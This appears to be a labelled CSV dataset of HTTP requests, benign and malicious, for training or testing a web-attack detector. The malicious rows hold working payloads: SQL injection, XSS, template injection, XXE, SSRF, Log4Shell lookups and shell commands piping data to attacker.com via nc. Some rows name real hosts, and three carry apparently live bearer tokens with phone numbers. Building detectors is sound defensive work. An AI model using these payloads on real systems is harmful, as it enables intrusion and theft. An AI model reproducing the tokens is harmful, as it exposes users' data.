method,path,query,headers,body,ua,label
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,__proto__[admin]=true,,,1
GET,/,,%253cscript%253ealert(1)%253c/script%253e,,,1
GET,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,GET /auth/google/callback,,,0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,GET /checkout/step1,,,0
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,GET /,,,0
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/admin,q=admin'--,Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
DELETE,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,"POST /chat/init {""user_id"": ""u_55"", ""topic"": ""billing""}",,,0
GET,/,,GET /favicon.ico,,,0
GET,/,,dict://localhost:11211/stat,,,1
GET,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
PUT,/admin,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,Nmap Scripting Engine,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
DELETE,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,<script>alert('XSS')</script>,,,1
GET,/favicon.ico,,,,,0
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,GET /search?q=machine+learning,,,0
GET,/favicon.ico,,,,,0
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/favicon.ico,,,,,0
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
POST,/index.php,,Host: example.com; Accept: */*,input=' OR 1=1--,Nmap Scripting Engine,1
GET,/admin,q=' OR 'x'='x,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
GET,/,,http://127.0.0.1:22,,,1
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
GET,"/contao/""><script>alert(document.domain)</script>",,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0",1
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,POST /graphql (query { me { name } }),,,0
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
PUT,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,php://input,,,1
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
DELETE,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,GET /sitemap.xml,,,0
GET,/,,GET /images/logo.png,,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,__proto__[admin]=true,,,1
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
PUT,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/favicon.ico,,,,,0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/favicon.ico,,,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,GET /login,,,0
GET,/,,Host: evil.com,,,1
GET,/,,GET /api/v1/products,,,0
DELETE,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/php/setup.php,step=4&PDF2SWF_PATH=echo+Y3VybCBvYXN0LnBybw==+%7C+base64+-d+%7C+sh+%3Econfig/output.txt%3B,"Accept-Encoding: gzip; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",1
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,//////////////////etc/passwd,,,1
GET,/,,; cat /etc/passwd,,,1
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/favicon.ico,,,,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,<body onload=alert(1)>,,,1
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/favicon.ico,,,,,0
GET,/,,php://input,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/api/v1/users,"q="" onmouseover=alert(1) """,Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/favicon.ico,,,,,0
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,DELETE /api/v1/cart/items/5,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,"{""alg"":""none""}",,,1
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/blog/article-1,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/admin,q=<script>alert(1)</script>,Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/favicon.ico,,,,,0
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,GET /user/profile,,,0
GET,/,,url=http://malicious.com,,,1
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/web-api/orders/5eb174d4-4816-4aec-abfe-9169931d8154,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzQzMjM3MDUiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiMjQwMGM2ODEtMmQzZC00NTMzLWJlMGMtMTc1M2Y1OTFjNjljIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzQzMjM3MDUiLCJzdWIiOiJXRUJTSVRFQDA3NzQzMjM3MDUiLCJpYXQiOjE3NzA2MzAxODIsImV4cCI6MTc3MTIzNDk4Mn0.4NvxYRTSzGjxcwpfU8U5PSbgUkJPlczc35kdZb18Uh4; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 0c4ad4da-6535-4160-909e-a4bf5f7828cd",,python-requests/2.32.5,0
GET,/,,../../../../etc/passwd%00,,,1
DELETE,/index.php,,Host: example.com; Accept: */*,input=' OR 1=1--,Nikto/2.1.6,1
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,admin*)(| (password=*)),,,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,' or '1'='1,,,1
GET,/,,GET /search?q=security,,,0
GET,/,,%0als,,,1
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,GET /api/v1/ping,,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,admin*)(| (password=*)),,,1
GET,/,,GET /user/mfa/setup-qr,,,0
DELETE,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"POST /chat/init {""user_id"": ""u_55"", ""topic"": ""billing""}",,,0
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/,,expect://id,,,1
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,{{7*7}} or {{config.items()}},,,1
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/search,q=../../../../etc/passwd,Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,java\tscript:alert(1),,,1
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,GET /feed/news.rss,,,0
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,GET /config/app-settings.json,,,0
GET,/favicon.ico,,,,,0
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,`uname -a`,,,1
GET,/,,Host: evil.com,,,1
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/index.php,option=com_ccnewsletter&controller=../../../../../../../../../../etc/passwd%00,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",,"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",1
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
PUT,/index.php,,Host: example.com; Accept: */*,input=admin'--,sqlmap/1.5.2,1
GET,/,,id=1' OR '1'='1,,,1
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,GET /search?q=machine+learning,,,0
GET,/web-api/orders/fda5b936-bebe-47b2-bcd2-d5775671407e,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzQ3NDQ1NzciLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiY2VlZjFiYmEtODY0ZC00ZDk2LTk2NTQtYjkzOTY2NDM4Mjk3IiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzQ3NDQ1NzciLCJzdWIiOiJXRUJTSVRFQDA3NzQ3NDQ1NzciLCJpYXQiOjE3NzA2MzAzNTEsImV4cCI6MTc3MTIzNTE1MX0.6hDSlCsc35iU3klLbYs6ILEEfzLQKj_reiFDaMjBRCU; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: c17df832-3297-4c93-ba2e-e3bb9e33a763",,python-requests/2.32.5,0
GET,/,,${os.system('id')},,,1
GET,/web-api/orders/5f6d22d5-8616-4f47-a27c-f87839923d20,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzI5NTIzNzciLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiYWRhN2M1NWUtOWVjOC00Y2M0LTk1MWEtYjRmNDgwMWZmNjUxIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzI5NTIzNzciLCJzdWIiOiJXRUJTSVRFQDA3NzI5NTIzNzciLCJpYXQiOjE3NzA2MzAyMTAsImV4cCI6MTc3MTIzNTAxMH0.rO6vxaAJDDGef_40vcEXChpUmk4nuoR_4hUFVeZMaYs; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: a401b1dd-2b03-4613-86f0-f58336f28964",,python-requests/2.32.5,0
GET,/,,%0d%0a* CAPABILITY,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,../../../../etc/passwd,,,1
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
PUT,/search,,Host: example.com; Accept: */*,input=' OR 1=1--,Nmap Scripting Engine,1
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/,,GET /auth/logout/confirm,,,0
POST,/search,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,sqlmap/1.5.2,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,http://127.0.0.1:22,,,1
GET,/,,GET /,,,0
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,GET /stream/audio/segment_77.aac,,,0
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,GET /user/profile,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /robots.txt,,,0
GET,/,,{{7*7}} or {{config.items()}},,,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
POST,/login,,Host: example.com; Accept: */*,username=user310&password=pass632,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,$(whoami),,,1
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,id=1&id=2,,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,<body onload=alert(1)>,,,1
GET,/,,GET /downloads/guide-v2.pdf,,,0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
DELETE,/blog/article-1,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
GET,/,,|| ls -la,,,1
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/favicon.ico,,,,,0
GET,/,,%0d%0a* CAPABILITY,,,1
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,GET /checkout/step1,,,0
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,GET /auth/google/callback,,,0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,GET /images/logo.png,,,0
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
PUT,/index.php,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,sqlmap/1.5.2,1
GET,/,,${os.system('id')},,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,GET /login,,,0
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
DELETE,/index.php,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,curl/7.68.0,1
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,$(whoami),,,1
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,GET /settings/security,,,0
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
DELETE,/index.php,,Host: example.com; Accept: */*,input=' OR 1=1--,curl/7.68.0,1
GET,/favicon.ico,,,,,0
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
GET,/,,"{""alg"":""none""}",,,1
GET,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
DELETE,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,php://input,,,1
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/favicon.ico,,,,,0
GET,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /downloads/guide-v2.pdf,,,0
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,GET /config/app-settings.json,,,0
GET,/,,id=1; DROP TABLE users--,,,1
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,id=1' OR '1'='1,,,1
GET,/,,id=1&id=2,,,1
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,GET /search?q=C%23,,,0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
DELETE,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
